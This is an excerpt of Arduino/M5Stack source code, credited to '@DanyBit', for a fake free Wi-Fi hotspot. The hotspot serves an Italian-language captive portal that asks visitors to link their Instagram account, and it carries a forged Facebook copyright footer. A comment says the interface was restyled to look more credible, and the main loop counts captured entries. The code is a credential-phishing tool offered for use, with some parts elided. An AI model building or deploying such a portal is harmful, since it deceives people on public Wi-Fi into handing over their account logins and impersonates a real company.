...
// Modificato con UI in Italiano e migliorata l'estetica per un risultato più credibile /// 
/// Progetto a cura di @DanyBit /// 

// User configuration
#define SSID_NAME "Wifi Gratuito"
#define SUBTITLE "Servizio Wifi Libero"
#define TITLE "Esegui L'accesso"
#define BODY "Collega il tuo account Instagram e lascia like per effettuare L'accesso"
#define POST_TITLE "Validazione profilo"
#define POST_BODY "Stiamo validando il tuo account, potrebbe volerci qualche minuto...</br>Grazie!"
...
String footer() {
  return
    "</div><div class=q><a>&#169; Facebook Ireland std // All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #5A5A5A; padding: 1.3em; }"
               "body { color: #4267B2; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #4267B2; display: block; font-style: italic; font-weight: bold; }"
               "nav { background:#5A5A5A; color: #4267B2; display: block; font-size: 1.3em; padding: 1em; }"
...
void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    ...
    if(capcount > previous){
      ...
      M5.Lcd.print("DANYBIT CAPT. PORTAL");
